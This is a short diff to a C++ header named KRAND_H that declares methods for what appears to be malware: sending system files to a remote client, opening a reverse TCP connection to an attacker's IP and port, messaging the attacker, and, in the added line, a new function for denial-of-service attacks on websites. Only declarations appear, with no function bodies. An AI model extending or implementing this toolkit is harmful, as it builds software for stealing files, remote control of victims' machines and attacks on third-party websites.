@@ -54,6 +54,7 @@ public:
     void send_system_files_to_client(const std::string &client_ip, int client_port);
     void reverse_tcp(const std::string &attacker_ip, int attacker_port);
     void send_message_to_attacker(const std::string &attacker_ip, int attacker_port, const std::string &message);
+    void do_dos_website(const std::string &target_url, bool loop, int count);
 };
 
 #endif  // KRAND_H
